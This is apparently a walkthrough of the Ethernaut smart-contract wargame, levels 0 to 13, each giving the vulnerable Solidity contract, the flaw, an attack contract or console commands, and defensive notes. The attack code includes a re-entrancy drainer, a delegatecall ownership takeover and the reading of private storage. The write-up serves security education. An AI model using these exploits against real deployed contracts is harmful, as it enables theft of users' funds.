# Levels

https://ethernaut.openzeppelin.com/

## 0. Hello Ethernaut

Just follow the console prompt.

## 1. Fallback

### Goal

1. Claim ownership
2. Withdraw all the balance

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Vulnerable Parts

```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    // In order to reach this code, you have to be a contributor first.
    owner = msg.sender;
  }

 function contribute() public payable {
    // send less than 0.001 ether to become a contributor.
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    // good checking here.
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

```

### Attack!

1. Contribute any amount less than 0.001, by calling the contribute function, pass `{value: 0.0001}` to specify amount
2. Send some amount straight to the contract, with no data field and specify any amount more than 0. This will trigger the `receive()` fallback function and make you the owner.
3. Now you are the owner, call `withdraw()` function to withdraw all the money in the contract.

## 2. Fallout

### Goal

Claim Ownership.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  // constructor
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Vulnerable Parts

```solidity
  // constructor, LOL
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

### Attack!

1. Constructor is not `constructor() {}`, but it's a function!
2. This function changes the owner.
3. Call `Fal1out()` to claim ownership.

## 3. Coin Flip

### Goal

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help

- Section "Beyond the console"

#### Beyond the console

Some levels will require working outside of the browser console. That is, writing solidity code and deploying it in the network to attack the level's instance contract with another contract. This can be done in multiple ways, for example:

1. Use Remix to write the code and deploy it in the corresponding network See [Remix Solidity IDE](https://remix.ethereum.org/).
2. Setup a local truffle project to develop and deploy the attack contracts. See [Truffle Framework](http://truffleframework.com/).

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### Vulnerable Parts

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

1. This is not truly random.

### Attack!

1. Write an attack script that calculates the answer, then submit

   ```solidity
   contract Attack {
       using SafeMath for uint256;
       uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
       CoinFlip constant originalContract = CoinFlip(address(0x13C6CB070a82EB153BA55d58A132cc247760BB9E));

       function hackFlip() public {
           uint256 coinFlip = uint256(blockhash(block.number - 1)).div(FACTOR);
           bool side = coinFlip == 1 ? true : false;
           originalContract.flip(side);
       }
   }
   ```

2. call `hackFlip()` function 10 times (or use hardhat to automate the calling).

### Note

Never use block, msg.sender related stuff to generate random number, they are not truly random.

Use chainlinks service to get a random number, it's safer!

## 4. Telephone

### Goal

Claim ownership.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Vulnerable Parts

```solidity
function changeOwner(address _owner) public {
	// Contracts can pretend to be owner.
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```

### Attack!

```solidity
contract AttackTelephone {
    address telephoneAddress;
    address me;

    constructor(address _telephoneAddress) public {
        me = msg.sender;
        telephoneAddress = _telephoneAddress;
    }

    function attackTelephone() public {
        Telephone telephone = Telephone(telephoneAddress);
        telephone.changeOwner(me);
    }
}
```

1. Deploy to the same network as Telephone, remember to put target address in constructor.
2. call `attackTelephone()`
3. Check owner on `Telephone` contract.

### Note

Never use `tx.origin` to authenticate. Use `msg.sender`

## 5. Token

### Goal

Hack the basic token contract to get more tokens. You are given 20 tokens at the start.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### Vulnerable Parts

```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

1. Not using safe math makes this function prone to overflow and underflow.
2. The require statement is there just for display because when you pass the `_value` bigger than your balance, it will underflow in the require statement, the number will be > 0. Example: uint(20-21) is a very big number which is > 0. The number will never go below 0.

### Attack!

1. Send 21 tokens to cause a underflow, since we only have 20 tokens.
2. 20 - 21 = -1 which will be represented as a very big number in unsigned int.

### Note

Overflows are very common in solidity and must be checked for with control statements such as:

```
if(a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```
a = a.add(c);
```

If there is an overflow, the code will revert.

## 6. Delegation

### Goal

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### Vulnerable Parts

```solidity
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data); // <- can be used to call pwn()
    if (result) {
      this;
    }
  }

  function pwn() public {
    owner = msg.sender;
  }
```

### Attack!

1. Write a contract that will get you the function signature.

```solidity
contract AttackPwn {
    function selector() public view returns (bytes memory selector) {
        selector = abi.encodeWithSignature("pwn()");
        // or bytes4(keccak256(bytes("pwn()")));
    }
    function takeControl(address _delegationAddress) public {
        (bool success,) = _delegationAddress.call(selector());
        require(success);
    }
}
```

2. Check the function signature. Output: `bytes: selector 0xdd365b8b`
3. Trick the contract to fallback and use the `fallback()` to call `pwn()`. (Can be done in solidity / js)
   - In solidity call the `takeControl(address _delegationAddress)` we just wrote. This will grant `AttackPwn` the ownership.
   - In js
     ```javascript
     await sendTransaction({
       from: "my address",
       to: "contract address",
       data: "0xdd365b8b", // <- function selector goes here.
     });
     ```
4. Enjoy your ownership.

### Note

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks.

With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state" (Hey other contract, come fuck me up).

Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

### Special Mention

- [Coin monks gives a pretty good explanation on how delegate fucks with your storage](https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4)
- [Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/)

## 7. Force

### Goal

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### Vulnerable Parts

The contract itself.

### Attack!

1. There's no way to get this Force contract to receive money. You can try sending it 0.01 ether or 0.02. But there's this `selfdestruct` method.
2. The `selfdestruct` method will cost **negative** gas (I didn't write that wrong). And we can specify an address to transfer the balance to.
3. So, in order to shove some ether up Force's ahole, we call the `selfdestruct(address addressToRefundTo)` method but on another contract.
4. ```solidity
   contract ForceForceToReceive {
       address payable private immutable s_forceAddress;
       constructor(address payable forceAddress) public {
           s_forceAddress = forceAddress;
       }

       receive() external payable {
       }

       function selfDestroy() public payable {
           selfdestruct(s_forceAddress);
       }
   }
   ```

5. We deploy the code and fund the `ForceForceToReceive` contract, and call the `selfDestroy()` method. All the money will be transferred to the Force contract whether it likes it or not.

### Notes

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

### Special Mention

[0xSage my fucking savior](https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57)

## 8. Vault

### Goal

Unlock the `Vault`.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### Vulnerable Parts

```solidity
bool public locked;
bytes32 private password;
```

1. Although this `password` variable is private. There are still some ways to read a contract's storage.
2. For example, web3.eth.getStorageAt(addr, varPosition); from web3.js

### Attack!

1. In the console, call `await web3.eth.getStorageAt(contract.address, 1);` (1 because `password` is at the second position).
2. Then, we get a hex `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`.
3. Use this hex to unlock the vault. `await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")`
4. `await contract.locked()` will give us `false` now.
5. Enjoy the gold inside the vault.

### Note

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

### Special Mention

[Read the damn docs](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)
[Solidity by example](https://solidity-by-example.org/)

## 9. King

### Goal

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

### Vulnerable Parts

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); // <---- Vulnerable
    king = msg.sender;
    prize = msg.value;
  }
```

1. `king.transfer(msg.value)` is vulnerable because if king doesn't accept any payment, it will always revert.

### Attack!

Use another contract to attack!

```solidity
contract BadKing {
  address payable private s_kingAddress;

  // Need to pay some eth to the constructor, since the contract doesn't have a receive() function.
  constructor (address payable _kingAddress) public payable {
    s_kingAddress = _kingAddress;
  }

  function attack() public payable {
    (bool success,) = s_kingAddress.call{value: msg.value}("");
    require(success);
  }

  // Don't implement a receive function. This contract is not supposed to receive any payment.
}
```

1. Deploy this contract with some eth (say 0.003).
2. Call attack with a value less than the eth deposited (need to pay for gas).
3. Broke the game!

### Special Mention

- [DOS](https://solidity-by-example.org/hacks/denial-of-service)
- [Level 9 Walkthrough](https://medium.com/coinmonks/ethernaut-lvl-9-king-walkthrough-how-bad-contracts-can-abuse-withdrawals-db12754f359b)
- [Real Case: King of Ether](http://www.kingoftheether.com/postmortem.html)

## 10. Re-entrancy

### Goal

Steal all the money from the contract

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

### Vulnerable Parts

```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}(""); // <- shouldn't transfer at first
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
      // should transfer here.
    }
  }
```

### Attack!

```solidity
contract AttackReentrance {
    Reentrance private immutable i_reentrance;
    address payable private immutable i_owner;
    uint256 constant private AMOUNT = 500000000000000;

    // Fund Contract at init
    constructor(address payable reentranceAddress) public payable {
        i_reentrance = Reentrance(reentranceAddress);
        i_owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == i_owner);
        _;
    }

    function contractBal() public view returns(uint256) {
        return address(this).balance;
    }

    function reentranceContractBal() public view returns(uint256) {
        return address(i_reentrance).balance;
    }

    function withdraw() external payable onlyOwner {
        address payable withdrawAddress = payable(msg.sender);
        require(withdrawAddress != payable(address(0)));
        (bool success,) = withdrawAddress.call{value: address(this).balance}("");
        require(success);
    }

    function attack() public {
        i_reentrance.donate{value: AMOUNT}(address(this));
        i_reentrance.withdraw(AMOUNT);
    }

    receive() external payable {
        if (address(i_reentrance).balance != 0) {
            i_reentrance.withdraw(AMOUNT);
        }
    }
}
```

1. Since the contract only has 0.001 ether, I am going to transfer it half the amount.
2. Deploy this script, with value 0.007 ether to fund this contract (leave some gas fees).
3. Call `attack()`, it will kick start the recursive.
4. `attack()` will deposit some funds to the victim
5. `attack()` will call `victim.withdraw()` to withdraw `AMOUNT` donated.
6. Victim will call `receive()`
7. `receive()` will call `victim.withdraw()`
8. Victim will not realize the transfer is completed, it will send the funds again.
9. Victim will repeat until it's out of funds.
10. Call `AttackReentrance.withdraw()` function to take out the funds.
11. Enjoy other people's hard earned money. (Don't)

### Note

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

#### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. [See 15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).

### Special Mention

[0xSage](https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14)
[Hackernoon](https://hackernoon.com/hack-solidity-reentrancy-attack)
[Solidity by example](https://solidity-by-example.org/hacks/re-entrancy)

## 11. Elevator

### Goal

Set top to true.

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Vulnerable Parts

```solidity
function goTo(uint _floor) public {
  Building building = Building(msg.sender);

  // First time we must make isLastFloor false, in order to execute stuff in the if statement (!false = true)
  if (! building.isLastFloor(_floor)) {
    floor = _floor;
    // Second time we call isLastFloor it should be true, in order for top to be true.
    top = building.isLastFloor(floor);
  }
}
```

1. This function is calling building's `isLastFloor()` for flow control.
2. But Building is just an interface, we can come up with our own implementations to trick the contract to think it's at the top.

### Attack!

```solidity
contract CapitalTower is Building {
    Elevator private immutable i_elevator;
    bool private switchFlipped = false;

    constructor(address elevatorAddress) public {
        i_elevator = Elevator(elevatorAddress);
    }

    function isLastFloor(uint) external override returns(bool) {
        // First call must return false, second call must return true.
        // first call
        if (!switchFlipped) {
            switchFlipped = true;
            return false;
        // second call
        } else {
            switchFlipped = false;
            return true;
        }
    }

    function hack() public {
        i_elevator.goTo(1);
    }
}
```

### Note

1. It's a stupid challenge.
2. You can use the `view` function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](https://docs.soliditylang.org/en/develop/contracts.html#view-functions) and learn its caveats.
3. An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.

### Special Mention

[0xSage](https://medium.com/coinmonks/ethernaut-lvl-11-elevator-walkthrough-how-to-abuse-solidity-interfaces-and-function-state-41005470121d)

### 12. Privacy

### Goal

locked = false

### Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

### Vulnerable Parts

```solidity
// private doesn't mean it cannot be read.
bytes32[3] private data;

function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2])); // it's telling us that data[2] is the place for password, convenient.
    locked = false;
}
```

### Attack!

1. In console, `await web3.eth.getStorageAt(contract.address,5)` (password at storage slot 5)
2. Then we write a contract in remix.

   ```solidity
   contract CrackPrivacy {
     Privacy private immutable i_privacy;
     constructor(address privacyAddress) public {
         i_privacy = Privacy(privacyAddress);
     }

     function crack(bytes32 password) public {
         i_privacy.unlock(bytes16(password));
     }

     function getLocked() public view returns(bool) {
         return i_privacy.locked();
     }
   }
   ```

3. Deploy to Rinkeby
4. Call `crack` with the `getStorageAt` result.
5. `locked` should be `false` now.

### Note

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

### Special Mention

1. [Beating Ethernaut: level 12 Privacy](https://blog.blockmagnates.com/beating-ethernaut-level-12-privacy-53a48644d42e)
2. [Layout of State Variables in Storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)


## 13. Gatekeeper One
### Goal
Make it past the gatekeeper and register as an entrant to pass this level.

### Source Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Vulnerable Parts
```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

```

### Attack!
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract GatekeeperOneAttack {

  constructor(address GatekeeperOneContractAddress) public {
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
    
    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To migitage, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
      key
    );

    // gas offset usually comes in around 210, give a buffer of 60 on each side
    for (uint256 i = 0; i < 120; i++) {
      (bool result, ) = address(GatekeeperOneContractAddress).call{gas: i + 150 + 8191 * 3}(encodedParams);
      if(result)
        {
        break;
      }
    }
  }
}
```

### Special Mention
1. [0xSage](https://forum.openzeppelin.com/t/ethernaut-level-13-gatekeeper-one-correct-opcode-for-gasleft-mod-8191/2125)
2. [Ethernaut Repo](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/attacks/GatekeeperOneAttack.sol)

